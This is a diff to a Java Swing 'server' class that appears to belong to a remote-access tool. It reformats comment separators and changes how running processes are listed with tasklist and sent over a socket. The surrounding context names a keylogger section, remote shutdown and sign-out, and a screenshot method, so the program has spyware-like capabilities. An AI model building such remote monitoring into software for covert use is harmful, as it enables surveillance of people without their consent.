@@ -156,7 +156,7 @@ public class server extends javax.swing.JFrame {
 //            }
 //        });
 //    }
-    
+      //------------------------------------------------------------------------------------------------------------------------------------------------
     // Keylogger
     
     int counthookKey = 0;
@@ -254,6 +254,7 @@ public class server extends javax.swing.JFrame {
     }
     
     // End Keylogger
+      //------------------------------------------------------------------------------------------------------------------------------------------------
     public void shutdown()
     {
         try{
@@ -265,7 +266,7 @@ public class server extends javax.swing.JFrame {
             JOptionPane.showMessageDialog(null,ex);
         }
     }
-    
+      //------------------------------------------------------------------------------------------------------------------------------------------------
     public void signout()
     {
         try{
@@ -277,12 +278,12 @@ public class server extends javax.swing.JFrame {
             JOptionPane.showMessageDialog(null,ex);
         }
     }
-    
+      //------------------------------------------------------------------------------------------------------------------------------------------------
     public void xemprocess()
     {
         try {
                         String line = null;
-                        p = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
+                        p = Runtime.getRuntime().exec("tasklist /FO CSV /NH");
                         input = new BufferedReader(new InputStreamReader(p.getInputStream()));                  
                         int soprocess = 0;
                         while(input.readLine() != null){
@@ -292,27 +293,17 @@ public class server extends javax.swing.JFrame {
                         program.os.write(soprocess1);
                         program.os.newLine();
                         program.os.flush();
-                        p1 = Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");
+                        p1 = Runtime.getRuntime().exec("tasklist /FO CSV /NH");
                         input = new BufferedReader(new InputStreamReader(p1.getInputStream()));
                         out = new ObjectOutputStream(program.sserver.getOutputStream());
                         try {
                             for(int i = 0; (i<soprocess) ;i++) {
                                 line = input.readLine();
                                 line = line.trim();
-                                if (i>=3)
-                                {
-                                    for (int u =0; u < line.length()-2;u++)
-                                    {
-                                        if ((line.charAt(u)>64 && line.charAt(u)<=122)&&(line.charAt(u+2)>64 && line.charAt(u+2)<=122) && line.charAt(u+1)==' ')
-                                        {
-                                            line = line.substring(0,u+1)+"_"+line.substring(u+2,line.length());
-                                        }
-                                    }
-                                    String[] splitline = line.split("\\s{1,100}");
-                                    String data[] = {splitline[0],splitline[1],splitline[2],splitline[3],splitline[4]+splitline[5]};
-                                    out.writeObject(data);
-                                    out.flush();
-                                }
+                                String[] splitline = line.split(",",5);
+                                String data[] = {splitline[0].replace("\"",""),splitline[1].replace("\"",""),splitline[2].replace("\"",""),splitline[3].replace("\"",""),splitline[4].replace("\"","")};
+                                out.writeObject(data);
+                                out.flush();
                             }
                         }catch(IOException e)
                         {
@@ -325,6 +316,7 @@ public class server extends javax.swing.JFrame {
                       JOptionPane.showMessageDialog(null,e);
                     }
     }
+    //------------------------------------------------------------------------------------------------------------------------------------------------
     public void xemapp()
     {
         try {
@@ -336,7 +328,6 @@ public class server extends javax.swing.JFrame {
                             soprocess++;
                         }
                         String soprocess1 = Integer.toString(soprocess);
-//                        program.os = new BufferedWriter(new OutputStreamWriter(program.sserver.getOutputStream()));
                         program.os.write(soprocess1);
                         program.os.newLine();
                         program.os.flush();
@@ -504,7 +495,7 @@ public void takepic() throws IOException
 //            }
 //        }
 //    }
-ByteArrayOutputStream ous = null;
+    ByteArrayOutputStream ous = null;
     ObjectOutputStream out = null;
     BufferedReader input = null;
     OutputStream os = null;
